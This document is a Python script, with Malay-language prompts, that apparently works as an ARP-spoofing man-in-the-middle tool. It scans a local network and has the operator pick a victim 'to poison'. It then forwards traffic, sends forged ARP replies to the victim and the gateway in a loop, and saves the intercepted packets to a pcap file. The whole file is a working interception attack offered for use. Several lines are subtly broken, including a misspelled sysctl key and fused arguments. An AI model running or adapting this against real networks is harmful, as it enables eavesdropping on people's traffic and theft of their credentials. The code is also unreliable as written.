from unittest import result
import scapy.all as scapy 
import subprocess
import sys
import time
import os
from ipaddress import IPv4Network
import threading

cwd = os.getcwd

def in_sudo_mode():
    if not 'SUDO_UID' in os.environ.keys():
        print("sila guna script ini dengan sudo. ")
        exit()

def arp_scan(ip_range):
    arp_responses = list()
    answered_lst = scapy.arping(ip_range, verbose=0)[0]
    
    for res in answered_lst:
        arp_responses.append({"ip" : res[1].psrc, "mac" : res[1].hwsrc})

    return arp_responses

def is_gateway(gateway_ip):
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    for row in result:
        if gateway_ip in row:
            return True
    
    return False

def get_interface_names():
    os.chdir("/sys/class/net")
    interface_names = os.listdir()
    return interface_names

def match_iface_name(row):
    interface_names = get_interface_names()
    for iface in interface_names:
        if iface in row:
            return iface
        
def gateway_info(network_info):
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    gateways = []
    for iface in network_info:
        for row in result:
            if iface ["ip"] in row:
                iface_name = match_iface_name(row)
                gateways.append({"iface" : iface_name, "ip" : iface["ip"], "mac" : iface["mac"]})

    return gateways

def clients (arp_res, gateway_res):
    client_list = []
    for gateway in gateway_res:
        for item in arp_res:
            if gateway["ip"] != item["ip"]:
                client_list.append(item)

    return client_list

def allow_ip_forwarding():
    subprocess.run(["sysctl", "-w" "net.ipv4.ip_foward=1"])
    subprocess.run(["sysctl", "-p" "/etc/sysctl.conf"])

def arp_spoofer(target_ip, target_mac, spoof_ip):
    pkt = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(pkt, verbose=False)

def send_spoof_packets():
    while True:
        arp_spoofer(gateway_info["ip"], gateway_info["mac"], sys["ip"])
        arp_spoofer(sys["ip"], sys["mac"], gateway_info["ip"])
        time.sleep(3)

def packet_sniffer(interface):
    packets = scapy.sniff(iface = interface, store = False, prn = process_sniffed_pkt)

def process_sniffed_pkt(pkt):
    print("Menulis ke fail pcap. Tekan ctrl + c untuk keluar.")
    scapy.wrpcap("requests.pcap", pkt, append=True)

def print_arp_res(arp_res):
    print(r""" _ _____ _____ __  __ _____ __  __ ____  _____ ____  
/ |___  |___  |  \/  | ____|  \/  | __ )| ____|  _ \ 
| |  / /   / /| |\/| |  _| | |\/| |  _ \|  _| | |_) |
| | / /   / / | |  | | |___| |  | | |_) | |___|  _ < 
|_|/_/   /_/  |_|  |_|_____|_|  |_|____/|_____|_| \_\ """)
    print("\n****************************************************************")
    print("\n* made by ./krypt0n.py                                         *")
    print("\n****************************************************************")
    print("ID\t\tIP\t\t\tMAC Address")
    print("_________________________________________________________")
    for id, res in enumerate(arp_res):
        print("{}/t/t{}/t/t{}".format(id,res['ip'], res['mac']))
    while True:
        try:
            choice = int(input("Sila pilih ID komputer yang cache ARPnya ingin anda racuni (ctrl+z untuk keluar): "))
            if arp_res[choice]:
                return choice
        except:
            print("Sila masukkan pilihan yang sah!")

def get_cmd_arguments():
    ip_range = None
    if len(sys.argv) - 1 > 0 and sys.argv[1] != "-ip_range":
        print("-ip_range bendera tidak dinyatakan.")
        return ip_range
    elif len(sys.argv) - 1 > 0 and sys.argv[1] == "-ip_range":
        try:
            print(f"{IPv4Network(sys.argv[2])}")
            ip_range = sys.argv[2]
            print("Julat ip yang sah dimasukkan melalui baris arahan.")
        except:
            print("Argumen baris perintah tidak sah dibekalkan.")

    return ip_range

in_sudo_mode()

ip_range = get_cmd_arguments()

if ip_range == None:
    print("Tiada julat ip yang sah dinyatakan. Keluar!")
    exit()

allow_ip_forwarding()

arp_res = arp_scan(ip_range)

if len(arp_res) == 0:
    print("Tiada sambungan. Keluar, pastikan peranti aktif atau dihidupkan.")
    exit()

gateways = gateway_info(arp_res)

gateway_info = gateways[0]

client_info = clients(arp_res, gateways)

if len(client_info) == 0:
    print("Tiada pelanggan ditemui semasa menghantar mesej ARP. Keluar, pastikan peranti aktif atau dihidupkan.")
    exit()

choice = print_arp_res(client_info)

sys = client_info[choice]

t1 = threading.Thread(target=send_spoof_packets, daemon=True)
t1.start()

os.chdir(cwd())

packet_sniffer(gateway_info["iface"])
